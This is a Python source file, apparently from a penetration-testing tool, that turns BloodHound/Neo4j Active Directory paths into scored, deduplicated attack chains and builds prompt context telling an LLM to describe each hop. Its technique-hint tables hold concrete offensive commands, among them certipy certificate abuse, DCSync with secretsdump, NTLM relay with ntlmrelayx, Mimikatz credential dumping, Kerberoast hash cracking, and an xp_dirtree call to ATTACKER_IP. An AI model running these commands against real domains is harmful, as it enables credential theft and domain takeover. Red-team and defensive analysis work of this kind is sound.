"""
Chain Discovery Service for Attack Path Analysis
Location: backend/routers/attack_paths/services/chain_discovery.py

Processes weighted path results from Neo4j into deduplicated attack chains.
Each chain represents a complete exploitation path from compromisable source
to high-value target, scored by autobloody's cost model.
"""

import logging
from typing import List, Dict, Any, Optional, Tuple
from collections import defaultdict

from ..constants.edge_costs import get_cost_for_edge, classify_cost

logger = logging.getLogger(__name__)


def extract_path_data(path_result: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """
    Extract nodes, edges, and intermediate details from a Neo4j path result.

    Handles both:
    - BloodHound CE format: {start, end, segments}
    - Standard format: {nodes, relationships}

    Returns dict with: source, target, intermediate_nodes, edges, total_cost, raw_path
    """
    path_data = path_result.get('p') or path_result.get('path')
    total_cost = path_result.get('totalCost', 0)

    if not path_data or not isinstance(path_data, dict):
        return None

    nodes = []
    edges = []

    # BloodHound CE format: segments
    if 'start' in path_data and 'segments' in path_data:
        segments = path_data.get('segments', [])
        if not segments:
            return None

        # First node from start
        nodes.append(_extract_node_info(path_data['start']))

        for seg in segments:
            rel = seg.get('relationship', {})
            edge_type = rel.get('type', rel.get('relType', 'Unknown')) if isinstance(rel, dict) else 'Unknown'
            edges.append(edge_type)
            nodes.append(_extract_node_info(seg.get('end', {})))

    # Standard format: nodes + relationships
    elif 'nodes' in path_data:
        raw_nodes = path_data.get('nodes', [])
        raw_rels = path_data.get('relationships', [])

        for n in raw_nodes:
            nodes.append(_extract_node_info(n))
        for r in raw_rels:
            edges.append(r.get('type', 'Unknown') if isinstance(r, dict) else 'Unknown')

    else:
        return None

    if len(nodes) < 2:
        return None

    source = nodes[0]
    target = nodes[-1]
    intermediate = nodes[1:-1]

    # Skip MemberOf-only chains — these are group membership paths
    # already covered by discovery queries
    has_exploit_edge = any(e.upper() != 'MEMBEROF' for e in edges)
    if not has_exploit_edge:
        return None

    # Skip DC → CoerceToTGT → Domain chains — this is default AD behavior
    # (every DC has unconstrained delegation). Only non-DC CoerceToTGT is actionable.
    edges_upper = [e.upper() for e in edges]
    non_memberof_edges = [e for e in edges_upper if e != 'MEMBEROF']
    if non_memberof_edges == ['COERCETOTGT'] and source.get('type') == 'Computer':
        source_props = source.get('properties', {})
        if source_props.get('isdc') or source_props.get('unconstraineddelegation'):
            return None

    # Compute total cost in Python (no longer done in Cypher)
    total_cost = 0
    for i, edge in enumerate(edges):
        target_idx = i + 1
        if target_idx < len(nodes):
            edge_target_type = nodes[target_idx].get('type', '')
        else:
            edge_target_type = ''
        total_cost += get_cost_for_edge(edge, edge_target_type)

    return {
        'source': source,
        'target': target,
        'intermediate_nodes': intermediate,
        'edges': edges,
        'total_cost': total_cost,
        'path_length': len(edges),
        'raw_path': path_data,
    }


def _extract_node_info(node: Dict) -> Dict[str, Any]:
    """Extract name, type, and key properties from a node."""
    if not isinstance(node, dict):
        return {'name': 'Unknown', 'type': 'Unknown', 'properties': {}}

    # Handle BloodHound CE nested properties
    props = node.get('properties', node)
    name = props.get('name', node.get('name', 'Unknown'))

    # Get type from labels — prefer known AD types over tags
    labels = node.get('labels', node.get('_labels', []))
    ad_types = ('User', 'Group', 'Computer', 'Domain', 'OU', 'GPO', 'Container')
    node_type = next((l for l in labels if l in ad_types), None)
    if not node_type:
        node_type = next((l for l in labels if l != 'Base' and not l.startswith('Tag_')), 'Unknown')

    # Extract attack-relevant properties
    attack_props = {}
    for prop_key in ['hasspn', 'dontreqpreauth', 'unconstraineddelegation',
                     'trustedtoauth', 'enabled', 'isdc', 'highvalue',
                     'serviceprincipalnames', 'admincount']:
        val = props.get(prop_key)
        if val is not None:
            attack_props[prop_key] = val

    return {
        'name': name,
        'type': node_type,
        'properties': attack_props,
    }


def get_exploitation_subpath(edges: List[str]) -> Tuple:
    """
    Extract the exploitation subpath — all non-MemberOf edges with their positions.
    Used as dedup key: paths sharing the same exploitation edges are considered equivalent.
    """
    return tuple(
        (i, e) for i, e in enumerate(edges) if e.upper() != 'MEMBEROF'
    )


def score_and_deduplicate_chains(
    chain_results: List[Dict[str, Any]],
    source_info: Dict[str, Dict] = None,
    add_log: callable = None
) -> List[Dict[str, Any]]:
    """
    Score and deduplicate chain results into unique attack chains.

    Args:
        chain_results: List of extracted path data dicts (from extract_path_data)
        source_info: Dict mapping source names to their discovery info
                     (e.g., {'SVC-ALFRESCO@HTB.LOCAL': {'type': 'asrep_roastable', 'priority': 1}})
        add_log: Logging callback

    Returns:
        List of deduplicated chain dicts, sorted by total_cost (cheapest first)
    """
    if not chain_results:
        return []

    def _log(level, msg):
        if add_log:
            add_log(level, msg)
        logger.info(msg)

    # Group chains by exploitation subpath + target
    groups = defaultdict(list)

    for chain in chain_results:
        if not chain:
            continue
        target_name = chain['target']['name']
        exploit_subpath = get_exploitation_subpath(chain['edges'])
        group_key = (target_name, exploit_subpath)
        groups[group_key].append(chain)

    # Build deduplicated chains
    deduplicated = []

    for (target_name, exploit_subpath), chains in groups.items():
        # Sort by cost, pick cheapest as representative
        chains.sort(key=lambda c: c['total_cost'])
        best_chain = chains[0]

        # Collect all unique entry points (sources)
        entry_points = []
        seen_sources = set()
        for chain in chains:
            src_name = chain['source']['name']
            if src_name not in seen_sources:
                seen_sources.add(src_name)
                src_type = 'unknown'
                if source_info and src_name in source_info:
                    src_type = source_info[src_name].get('type', 'unknown')
                elif chain['source']['properties'].get('dontreqpreauth'):
                    src_type = 'asrep_roastable'
                elif chain['source']['properties'].get('hasspn'):
                    src_type = 'kerberoastable'
                entry_points.append({
                    'name': src_name,
                    'type': chain['source']['type'],
                    'compromise_method': src_type,
                    'properties': chain['source']['properties'],
                })

        # Build exploitation edges detail
        exploitation_edges = []
        for i, edge in enumerate(best_chain['edges']):
            if edge.upper() == 'MEMBEROF':
                continue
            # Determine target label for this edge
            target_idx = i + 1
            if target_idx < len(best_chain['intermediate_nodes']):
                edge_target_type = best_chain['intermediate_nodes'][target_idx - 1]['type']
            elif target_idx == len(best_chain['edges']):
                edge_target_type = best_chain['target']['type']
            else:
                edge_target_type = ''
            cost = get_cost_for_edge(edge, edge_target_type)
            exploitation_edges.append({
                'edge': edge,
                'target_type': edge_target_type,
                'cost': cost,
            })

        # Determine severity from target type and cost
        target_type = best_chain['target']['type']
        total_cost = best_chain['total_cost']
        severity = _determine_chain_severity(target_name, target_type, total_cost)

        deduped_chain = {
            'entry_points': entry_points,
            'target': best_chain['target'],
            'intermediate_nodes': best_chain['intermediate_nodes'],
            'edges': best_chain['edges'],
            'exploitation_edges': exploitation_edges,
            'total_cost': total_cost,
            'cost_classification': classify_cost(total_cost),
            'path_length': best_chain['path_length'],
            'severity': severity,
            'entry_point_count': len(entry_points),
            'raw_path': best_chain['raw_path'],
        }
        deduplicated.append(deduped_chain)

    # Sort deterministically: by total cost first, then by target name, then by edges
    # This ensures identical input always produces identical output order
    deduplicated.sort(key=lambda c: (
        c['total_cost'],
        c['target']['name'],
        ','.join(c['edges']),
    ))

    _log("INFO", f"Chain discovery: {len(chain_results)} paths deduplicated to {len(deduplicated)} unique chains")

    return deduplicated


def _determine_chain_severity(
    target_name: str, target_type: str, total_cost: int
) -> str:
    """Determine severity based on target criticality and exploitation cost."""
    target_upper = target_name.upper()
    is_critical_target = (
        target_type == 'Domain'
        or 'DOMAIN ADMIN' in target_upper
        or 'ENTERPRISE ADMIN' in target_upper
        or target_upper.endswith('-512')
        or target_upper.endswith('-519')
    )

    if is_critical_target and total_cost <= 1000:
        return 'Critical'
    elif is_critical_target:
        return 'High'
    elif total_cost <= 100:
        return 'High'
    elif total_cost <= 100000:
        return 'Medium'
    else:
        return 'Low'


def _generate_chain_cypher(chain: Dict[str, Any]) -> str:
    """Generate a representative Cypher query for a chain discovery finding."""
    entry = chain['entry_points'][0]['name'] if chain['entry_points'] else 'source'
    target = chain['target']['name']
    edges = list(dict.fromkeys(chain['edges']))  # preserve order, dedupe
    edge_filter = '|'.join(edges)

    return (
        f"MATCH p = allShortestPaths((source)-[:{edge_filter}*1..]->(target))\n"
        f"WHERE source.name = '{entry}'\n"
        f"AND target.name = '{target}'\n"
        f"AND source <> target\n"
        f"RETURN p LIMIT 10"
    )


def build_chain_scenario(
    chain: Dict[str, Any],
    scenario_number: int
) -> Dict[str, Any]:
    """
    Convert a deduplicated chain into a scenario dict compatible with
    analyze_attack_scenarios_parallel().

    This bridges the chain discovery output with the existing LLM pipeline.
    """
    # Build results list (one per entry point, preserving the path structure)
    results = []
    for ep in chain['entry_points']:
        result = {
            'source': ep['name'],
            'target': chain['target']['name'],
            'edge_type': _get_primary_exploitation_edge(chain['edges']),
            'source_type': ep['type'],
            'target_type': chain['target']['type'],
            'source_properties': ep.get('properties', {}),
            'target_properties': chain['target'].get('properties', {}),
            'path_edges': chain['edges'],
            'intermediate_nodes': [n['name'] for n in chain['intermediate_nodes']],
            'intermediate_node_types': [n['type'] for n in chain['intermediate_nodes']],
            'path_length': chain['path_length'],
            'source_role': 'compromisable_entity',
            'target_role': 'privilege_target',
        }
        results.append(result)

    # Determine edges_used (unique non-MemberOf edges)
    edges_used = list(dict.fromkeys(
        e for e in chain['edges'] if e.upper() != 'MEMBEROF'
    ))

    # Build descriptive name
    chain_name = _generate_chain_name(chain)

    # Build RAG context specific to this chain
    rag_context = _build_chain_rag_context(chain)

    # Generate representative Cypher query for the finding
    cypher = _generate_chain_cypher(chain)

    scenario = {
        "scenario_number": scenario_number,
        "query_info": {
            "name": chain_name,
            "description": f"Dynamic chain: {chain['cost_classification']} exploitation cost ({chain['total_cost']})",
            "cypher_query": cypher,
            "cypher": cypher,
            "attack_type": "privilege_escalation",
            "priority": chain['severity'],
            "edges_used": edges_used,
            "rag_context": rag_context,
            "is_chain_discovery": True,
            "chain_data": {
                "total_cost": chain['total_cost'],
                "cost_classification": chain['cost_classification'],
                "entry_points": chain['entry_points'],
                "exploitation_edges": chain['exploitation_edges'],
            },
        },
        "results": results,
        "result_count": len(results),
        "query": cypher,
        "cypher_query": cypher,
    }

    return scenario


def _get_primary_exploitation_edge(edges: List[str]) -> str:
    """Get the last non-MemberOf edge (the final exploitation step)."""
    for edge in reversed(edges):
        if edge.upper() != 'MEMBEROF':
            return edge
    return edges[-1] if edges else 'Unknown'


def _generate_chain_name(chain: Dict[str, Any]) -> str:
    """Generate a descriptive name for a chain finding."""
    exploit_edges = [e for e in chain['edges'] if e.upper() != 'MEMBEROF']
    target_name = chain['target']['name'].split('@')[0]
    target_type = chain['target']['type']

    if target_type == 'Domain':
        last_edge = exploit_edges[-1] if exploit_edges else 'Unknown'
        if last_edge in ('WriteDacl', 'GenericAll', 'WriteOwner', 'Owns'):
            return f"{last_edge} on Domain via Group Chain"
        elif last_edge in ('DCSync', 'GetChangesAll'):
            return "DCSync via Group Chain"
        return f"Path to Domain Object via {last_edge}"

    if 'DOMAIN ADMIN' in target_name.upper():
        return f"Path to Domain Admins ({len(chain['edges'])} hops)"

    if 'ENTERPRISE ADMIN' in target_name.upper():
        return f"Path to Enterprise Admins ({len(chain['edges'])} hops)"

    return f"Exploitation Chain to {target_name} ({chain['cost_classification']})"


# Edge-specific technique hints for chain RAG context.
# Tells the LLM exactly which tool/technique to use for each edge type,
# preventing it from defaulting to wrong methods (e.g., Kerberoasting
# when Shadow Credentials is the correct technique).
_EDGE_TECHNIQUE_HINTS = {
    # ACL abuse on User → Shadow Credentials OR Targeted Kerberoasting
    ('GENERICWRITE', 'USER'): "Shadow Credentials: certipy shadow auto -u ATTACKER@DOMAIN -p PASS -account TARGET | OR Targeted Kerberoasting: bloodyAD set object TARGET servicePrincipalName -v 'fake/kerberoast' then impacket-GetUserSPNs to crack | OR targetedKerberoast.py (handles full workflow)",
    ('GENERICWRITE', 'COMPUTER'): "Shadow Credentials: certipy shadow auto -u ATTACKER@DOMAIN -p PASS -account TARGET$ | OR RBCD: rbcd.py",
    ('GENERICALL', 'USER'): "Shadow Credentials (preferred): certipy shadow auto | OR Targeted Kerberoasting: set SPN then crack | OR password reset (LDAP): Set-ADAccountPassword -Identity TARGET -Reset -NewPassword $newPass",
    ('GENERICALL', 'COMPUTER'): "Shadow Credentials or RBCD: certipy shadow auto / rbcd.py",
    ('ALLEXTENDEDRIGHTS', 'USER'): "ForceChangePassword (LDAP): Set-ADAccountPassword -Identity TARGET -Reset -NewPassword $newPass | OR bloodyAD set password TARGET | OR rpcclient setuserinfo2",
    ('FORCECHANGEPASSWORD', 'USER'): "Password reset (LDAP-based, NOT net user): Set-ADAccountPassword -Identity TARGET -Reset -NewPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force) | OR bloodyAD set password TARGET | OR rpcclient setuserinfo2. NEVER use 'net user /domain' — it uses SAMR which requires local admin on DC.",
    ('FORCECHANGEPASSWORD', ''): "Password reset (LDAP-based, NOT net user): Set-ADAccountPassword -Identity TARGET -Reset -NewPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force) | OR bloodyAD set password TARGET",
    ('WRITEOWNER', 'GROUP'): "Take ownership then add self: impacket-owneredit → impacket-dacledit → net rpc group addmem",
    ('WRITEOWNER', 'USER'): "Take ownership then Shadow Credentials: impacket-owneredit → impacket-dacledit → certipy shadow",
    ('WRITEDACL', 'GROUP'): "Grant self GenericAll then add members: impacket-dacledit → net rpc group addmem",
    ('WRITEDACL', 'USER'): "Grant self GenericAll then Shadow Credentials: impacket-dacledit → certipy shadow",
    ('WRITEDACL', 'DOMAIN'): "Grant self DCSync rights: impacket-dacledit → impacket-secretsdump",
    ('ADDSELF', 'GROUP'): "Add self to group: net rpc group addmem GROUP ATTACKER",
    ('ADDMEMBER', 'GROUP'): "Add user to group: net rpc group addmem GROUP TARGET",
    ('ADDKEYCREDENTIALLINK', ''): "Shadow Credentials: pywhisker or certipy shadow auto",
    ('WRITESPN', ''): "Targeted Kerberoasting: set SPN then impacket-GetUserSPNs",
    # ADCS — per-ESC technique hints
    # Tier 1: Direct exploitation
    ('ADCSESC1', ''): "ESC1: certipy req -u USER@DOMAIN -p PASS -ca CA -template TEMPLATE -upn administrator@DOMAIN",
    ('ADCSESC6', ''): "ESC6 (EDITF flag): certipy req -u USER@DOMAIN -p PASS -ca CA -template User -upn administrator@DOMAIN",
    ('ADCSESC9', ''): "ESC9: certipy account update -u USER@DOMAIN -p PASS -user TARGET -upn administrator@DOMAIN → certipy req",
    ('ADCSESC9', 'DOMAIN'): "ESC9: certipy account update -u USER@DOMAIN -p PASS -user TARGET -upn administrator@DOMAIN → certipy req",
    ('ADCSESC16', ''): "ESC16 (CA-wide ESC9): certipy account update -user TARGET -upn administrator@DOMAIN → certipy req",
    # Tier 2: Multi-step
    ('ADCSESC2', ''): "ESC2: certipy req with Any Purpose EKU template → use cert for client auth",
    ('ADCSESC3', ''): "ESC3: certipy req enrollment agent cert → certipy req on behalf of target user",
    ('ADCSESC13', ''): "ESC13: certipy req with issuance policy template → cert grants AD group membership",
    ('ADCSESC15', ''): "ESC15 (CVE-2024-49019): certipy req with v1 template + Application Policy override",
    # Tier 3: AD object modification
    ('ADCSESC4', ''): "ESC4: modify template (certipy template -u USER -template NAME -save-old) → exploit as ESC1 → restore",
    ('ADCSESC5', ''): "ESC5: modify PKI object/CA config → create or alter template → exploit",
    ('ADCSESC10', ''): "ESC10: write altSecurityIdentities on target → certipy req → authenticate as target",
    ('ADCSESC14', ''): "ESC14: add shadow credentials + request cert → advanced mapping → authenticate",
    # Tier 4: Relay or CA admin
    ('ADCSESC7', ''): "ESC7: certipy ca -u USER -ca CA (ManageCA) → enable SAN flag → approve certs → exploit as ESC1",
    ('ADCSESC8', ''): "ESC8: ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template TEMPLATE (requires auth coercion)",
    ('ADCSESC11', ''): "ESC11: certipy relay -ca CA (unencrypted RPC relay, requires auth coercion)",
    # Tier 5: CA compromise
    ('ADCSESC12', ''): "ESC12: extract CA private key from compromised CA server → certipy forge golden certificate",
    # Lateral movement
    ('ADMINTO', ''): "Local admin: impacket-psexec or evil-winrm",
    ('CANPSREMOTE', ''): "PowerShell remoting: evil-winrm -i TARGET -u USER -p PASS",
    ('CANRDP', ''): "RDP access: xfreerdp /v:TARGET /u:USER /p:PASS",
    # Credential access
    ('DCSYNC', 'DOMAIN'): "DCSync: impacket-secretsdump DOMAIN/USER:PASS@DC -just-dc",
    ('READGMSAPASSWORD', ''): "gMSA dump: gMSADumper.py or bloodyAD",
    ('READLAPSPASSWORD', ''): "LAPS read: nxc ldap DC -u USER -p PASS -M laps",
    # Coercion
    ('COERCETOTGT', ''): "Coerce TGT: PetitPotam or PrinterBug → capture with Rubeus",
    ('COERCEANDRELAYNTLMTOSMB', ''): "NTLM relay to SMB: ntlmrelayx.py -t smb://TARGET",
    ('COERCEANDRELAYNTLMTOLDAP', ''): "NTLM relay to LDAP: ntlmrelayx.py -t ldap://DC --delegate-access",
    ('COERCEANDRELAYNTLMTOADCS', ''): "NTLM relay to ADCS: ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp",
    # Session
    ('HASSESSION', ''): "Credential harvesting: Mimikatz sekurlsa::logonpasswords on compromised host",
}


def _get_edge_technique_hint(edge_type: str, target_type: str) -> str:
    """Look up the recommended technique for an edge + target type combination."""
    edge_upper = edge_type.upper()
    target_upper = target_type.upper() if target_type else ""

    # Try exact match first
    hint = _EDGE_TECHNIQUE_HINTS.get((edge_upper, target_upper))
    if hint:
        return hint

    # Try catch-all (empty target)
    hint = _EDGE_TECHNIQUE_HINTS.get((edge_upper, ''))
    if hint:
        return hint

    # ADCS ESC catch-all
    if edge_upper.startswith('ADCSESC'):
        return f"ADCS certificate abuse: certipy find + certipy req"

    return ""


def _build_chain_rag_context(chain: Dict[str, Any]) -> str:
    """Build RAG context string for a chain, describing the full path."""
    lines = []
    lines.append(f"WEIGHTED ATTACK CHAIN (Total Cost: {chain['total_cost']} — {chain['cost_classification']}):")
    lines.append("")

    # Full chain visualization
    all_nodes = []
    all_nodes.append(chain['entry_points'][0]['name'].split('@')[0])
    for mid in chain['intermediate_nodes']:
        all_nodes.append(mid['name'].split('@')[0])
    all_nodes.append(chain['target']['name'].split('@')[0])

    chain_str_parts = []
    for i, edge in enumerate(chain['edges']):
        src = all_nodes[i]
        tgt = all_nodes[i + 1] if i + 1 < len(all_nodes) else chain['target']['name'].split('@')[0]
        chain_str_parts.append(f"{src} -[{edge}]-> {tgt}")

    lines.append("PATH: " + " | ".join(chain_str_parts))
    lines.append("")

    # Entry points
    ep_strs = []
    for ep in chain['entry_points']:
        method = ep.get('compromise_method', 'unknown')
        ep_strs.append(f"{ep['name'].split('@')[0]} ({method})")
    lines.append(f"ENTRY POINTS: {', '.join(ep_strs)}")
    lines.append("")

    # Exploitation edges with costs and technique hints
    lines.append("EXPLOITATION STEPS:")
    for ee in chain['exploitation_edges']:
        edge_upper = ee['edge'].upper()
        target_type = ee['target_type'].upper()
        hint = _get_edge_technique_hint(edge_upper, target_type)
        if hint:
            lines.append(f"  - {ee['edge']} on {ee['target_type']} (cost: {ee['cost']}) → {hint}")
        else:
            lines.append(f"  - {ee['edge']} on {ee['target_type']} (cost: {ee['cost']})")
    lines.append("")

    # Source properties for attack method selection
    first_ep = chain['entry_points'][0]
    props = first_ep.get('properties', {})
    method = first_ep.get('compromise_method', 'unknown')

    if props.get('dontreqpreauth') or method == 'asrep_roastable':
        lines.append("INITIAL ACCESS: Source is AS-REP Roastable (dontreqpreauth=true)")
        lines.append("  Use: impacket-GetNPUsers to obtain hash, crack with hashcat -m 18200")
    elif props.get('hasspn') or method == 'kerberoastable':
        lines.append("INITIAL ACCESS: Source is Kerberoastable (hasspn=true)")
        lines.append("  Use: impacket-GetUserSPNs to request TGS, crack with hashcat -m 13100")
    elif method == 'outbound_control':
        lines.append("INITIAL ACCESS: Source has outbound ACL control over AD objects")
        lines.append("  This user has direct control edges (WriteOwner, GenericAll, GenericWrite, WriteDacl, etc.).")
        lines.append("  In an assumed-breach scenario, the attacker already has this user's credentials.")
        lines.append("  Start the attack chain from this user's ACL permissions — do NOT assume further credential theft is needed.")
    elif method == 'password_not_required':
        lines.append("INITIAL ACCESS: Source has PASSWD_NOTREQD flag — may have empty password")
        lines.append("  Use: nxc smb DC_IP -u USERNAME -p '' to test empty password login")
    elif method == 'gmsa_readable':
        lines.append("INITIAL ACCESS: Source's gMSA password is readable")
        lines.append("  Use: gMSADumper.py or bloodyAD to retrieve the NT hash")
    elif method == 'laps_readable':
        lines.append("INITIAL ACCESS: Source's LAPS password is readable")
        lines.append("  Use: nxc ldap DC_IP -u attacker -p pass -M laps")
    elif method == 'dangerous_group':
        lines.append("INITIAL ACCESS: Source is a member of an operationally-dangerous group")
        lines.append("  Leverage group privileges (DnsAdmins DLL injection, Backup Operators ntds.dit, etc.)")
    elif method == 'mssql_admin':
        lines.append("INITIAL ACCESS: Source has MSSQL admin access (SQLAdmin edge or SQL service account)")
        lines.append("  If Kerberoastable: impacket-GetUserSPNs to obtain TGS, crack with hashcat -m 13100")
        lines.append("  If already compromised: impacket-mssqlclient to connect, xp_cmdshell for RCE")
        lines.append("  Lateral movement: EXEC xp_dirtree '\\\\ATTACKER_IP\\\\share' for NTLM relay")
    elif method == 'adcs_adjacent':
        lines.append("INITIAL ACCESS: Source has ADCS-related privileges (ManageCA, Enroll, or CA service account)")
        lines.append("  If ManageCA: can approve pending certificate requests or add new officer")
        lines.append("  If Enroll on vulnerable template: certipy req -u user@DOMAIN -p pass -ca CA -template VULN_TEMPLATE")
        lines.append("  If CA service account: may have access to CA private key for Golden Certificate")
    elif method == 'unconstrained_delegation':
        lines.append("INITIAL ACCESS: Source is a computer with unconstrained delegation")
        lines.append("  Any user authenticating to this computer has their TGT cached in memory")
        lines.append("  Use: Rubeus monitor for incoming TGTs, or coerce authentication via PrinterBug/PetitPotam")
        lines.append("  Captured TGTs can be used to impersonate the authenticating user")
    elif method == 'stepping_stone':
        lines.append("INITIAL ACCESS: Source was discovered as an intermediate entity in other attack paths")
        lines.append("  This entity appeared in static query results — it may be reachable from a compromised user.")
        lines.append("  Assume the attacker has already compromised this entity through a prior attack step.")
        lines.append("  Focus the chain on what this entity can REACH, not how to initially compromise it.")
    lines.append("")

    lines.append("IMPORTANT: Describe EACH hop as a separate attack step using the actual entity names.")
    lines.append("The chain cost reflects exploitation difficulty — lower = easier = higher risk.")

    return "\n".join(lines)
